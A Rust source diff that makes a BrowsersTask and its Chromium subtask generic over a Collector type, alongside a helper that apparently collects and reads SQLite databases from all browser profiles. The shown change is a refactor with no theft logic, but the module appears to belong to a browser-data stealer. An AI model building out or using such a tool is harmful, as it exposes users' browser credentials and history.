@@ -1,3 +1,4 @@
+#![feature(let_chains)]
 #![no_std]
 
 extern crate alloc;
@@ -10,16 +11,17 @@ use alloc::string::{String, ToString};
 use crate::chromium::ChromiumTask;
 use alloc::vec;
 use alloc::vec::Vec;
+use collector::Collector;
 use core::fmt::{Display, Formatter};
 use tasks::Task;
 use tasks::{composite_task, impl_composite_task_runner, CompositeTask};
 use utils::path::{Path, WriteToFile};
 
-pub struct BrowsersTask {
-    inner: CompositeTask
+pub struct BrowsersTask<C: Collector> {
+    inner: CompositeTask<C>
 }
 
-impl BrowsersTask {
+impl<C: Collector + 'static> BrowsersTask<C> {
     pub fn new() -> Self {
         Self {
             inner: composite_task!(
@@ -29,7 +31,7 @@ impl BrowsersTask {
     }
 }
 
-impl_composite_task_runner!(BrowsersTask, "Browsers");
+impl_composite_task_runner!(BrowsersTask<C>, "Browsers");
 
 pub(crate) fn collect_and_read_sqlite_from_all_profiles<P, F, R, T, S>(
     profiles: &[Path],
